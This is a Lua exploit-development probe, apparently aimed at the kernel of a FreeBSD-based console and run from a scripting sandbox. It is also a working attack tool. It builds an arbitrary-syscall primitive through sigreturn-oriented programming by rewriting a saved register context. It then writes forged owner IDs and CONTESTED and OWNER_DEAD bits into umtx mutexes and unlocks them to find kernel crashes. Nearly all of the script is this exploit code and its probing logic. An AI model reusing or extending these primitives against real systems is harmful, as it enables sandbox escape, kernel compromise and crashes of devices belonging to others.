-- CRASH_CLASS: MODERATE
-- PROBE 146g2: Isolated CONTESTED bit tests
-- Split from 146g to identify which section crashes

print("=== PROBE 146g2: CONTESTED ISOLATED ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

-- [A] Lock, set CONTESTED (no waiter), unlock
print("--- [A] CONTESTED NO-WAITER ---")
local mtx = gpu + 0x1000
local mtx_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4)
for off = 8, 47, 4 do wd(mtx + off, 0) end

local ok1, rv1 = pcall(function()
    return srop(454, uint64(mtx_a), uint64(5), uint64(0), uint64(0), uint64(0))
end)
local o = to_num(memory.read_dword(mtx))
print("lock=" .. (ok1 and tostring(to_num(rv1)) or "FAIL") .. " owner=0x" .. string.format("%08X", o))

if o > 0 and o < 0x80000000 then
    wd(mtx, o + 0x80000000)
    print("set_contested=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))

    local ok2, rv2 = pcall(function()
        return srop(454, uint64(mtx_a), uint64(6), uint64(0), uint64(0), uint64(0))
    end)
    print("unlock=" .. (ok2 and tostring(rv2 and to_num(rv2) or "nil") or "CRASH"))
    print("after=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))
end
print("A_survived")

-- [B] Lock, set fake TID with CONTESTED, unlock
print("")
print("--- [B] FAKE OWNER ---")
local mtx2 = gpu + 0x2000
local mtx2_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))
wd(mtx2, 0)
wd(mtx2 + 4, 4)
for off = 8, 47, 4 do wd(mtx2 + off, 0) end

srop(454, uint64(mtx2_a), uint64(5), uint64(0), uint64(0), uint64(0))
print("locked=0x" .. string.format("%08X", to_num(memory.read_dword(mtx2))))

-- Set to fake TID without CONTESTED
wd(mtx2, 0x00DEAD00)
print("fake=0x" .. string.format("%08X", to_num(memory.read_dword(mtx2))))

local ok3, rv3 = pcall(function()
    return srop(454, uint64(mtx2_a), uint64(6), uint64(0), uint64(0), uint64(0))
end)
print("unlock_fake=" .. (ok3 and tostring(rv3 and to_num(rv3) or "nil") or "CRASH"))
print("B_survived")

-- [C] Fake TID WITH CONTESTED
print("")
print("--- [C] FAKE+CONTESTED ---")
local mtx3 = gpu + 0x3000
local mtx3_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))
wd(mtx3, 0)
wd(mtx3 + 4, 4)
for off = 8, 47, 4 do wd(mtx3 + off, 0) end

srop(454, uint64(mtx3_a), uint64(5), uint64(0), uint64(0), uint64(0))
print("locked=0x" .. string.format("%08X", to_num(memory.read_dword(mtx3))))

wd(mtx3, 0x80DEAD00)
print("fake_contested=0x" .. string.format("%08X", to_num(memory.read_dword(mtx3))))

local ok4, rv4 = pcall(function()
    return srop(454, uint64(mtx3_a), uint64(6), uint64(0), uint64(0), uint64(0))
end)
print("unlock=" .. (ok4 and tostring(rv4 and to_num(rv4) or "nil") or "CRASH"))
print("C_survived")

-- [D] Owner = 0 with CONTESTED (simulating race mid-unlock)
print("")
print("--- [D] ZERO+CONTESTED ---")
local mtx4 = gpu + 0x4000
local mtx4_a = uint64(string.format("0x%X%08X", gh, gl + 0x4000))
wd(mtx4, 0)
wd(mtx4 + 4, 4)
for off = 8, 47, 4 do wd(mtx4 + off, 0) end

wd(mtx4, 0x80000000) -- CONTESTED but owner=0
print("zero_contested=0x" .. string.format("%08X", to_num(memory.read_dword(mtx4))))

local ok5, rv5 = pcall(function()
    return srop(454, uint64(mtx4_a), uint64(5), uint64(0), uint64(0), uint64(0))
end)
print("lock_zero_contested=" .. (ok5 and tostring(rv5 and to_num(rv5) or "nil") or "CRASH"))
print("D_survived")

-- [E] OWNER_DEAD + CONTESTED
print("")
print("--- [E] DEAD+CONTESTED ---")
local mtx5 = gpu + 0x5000
local mtx5_a = uint64(string.format("0x%X%08X", gh, gl + 0x5000))
wd(mtx5, 0)
wd(mtx5 + 4, 4)
for off = 8, 47, 4 do wd(mtx5 + off, 0) end

srop(454, uint64(mtx5_a), uint64(5), uint64(0), uint64(0), uint64(0))
local o5 = to_num(memory.read_dword(mtx5))

-- Set OWNER_DEAD + CONTESTED + tid
wd(mtx5, 0xC0000000 + (o5 % 0x40000000))
print("dead_contested=0x" .. string.format("%08X", to_num(memory.read_dword(mtx5))))

-- Try unlock
local ok6, rv6 = pcall(function()
    return srop(454, uint64(mtx5_a), uint64(6), uint64(0), uint64(0), uint64(0))
end)
print("unlock=" .. (ok6 and tostring(rv6 and to_num(rv6) or "nil") or "CRASH"))
print("E_survived")

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
